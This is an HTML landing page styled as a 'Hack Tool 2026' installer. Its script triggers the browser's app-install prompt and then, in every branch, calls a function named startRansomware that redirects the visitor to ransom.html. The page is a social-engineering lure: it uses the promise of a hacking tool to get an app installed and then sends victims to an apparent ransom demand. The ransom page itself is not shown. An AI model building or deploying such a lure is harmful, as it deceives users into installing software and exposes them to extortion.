<!DOCTYPE html>
<html>
<head>
    <title>🔥 Hack Tool 2026</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <link rel="manifest" href="manifest.json">
    <meta name="theme-color" content="#FF0000">
    <style>body{margin:0;background:linear-gradient(45deg,#f00,#000);height:100vh;display:flex;align-items:center;justify-content:center;flex-direction:column;color:#fff;font-family:Arial;font-size:24px;}
    button{padding:20px;font-size:28px;background:#0f0;color:#000;border:none;border-radius:15px;cursor:pointer;}
    button:hover{transform:scale(1.1);}
    </style>
</head>
<body>
    <h1>📱 Install Hack Tool</h1>
    <p>Add to Home Screen for Full Access</p>
    <button onclick="installPWA()">🚀 INSTALL NOW</button>
    <p id="status"></p>
    
    <script>
        let deferredPrompt;
        window.addEventListener('beforeinstallprompt', (e) => {
            e.preventDefault();
            deferredPrompt = e;
        });
        
        function installPWA() {
            if (deferredPrompt) {
                deferredPrompt.prompt();
                deferredPrompt.userChoice.then(() => {
                    document.getElementById('status').innerText = '✅ Installed! Open from Home Screen';
                    startRansomware();
                });
            } else {
                startRansomware();
            }
        }
        
        function startRansomware() {
            window.location.href = 'ransom.html';
        }
    </script>
</body>
</html>
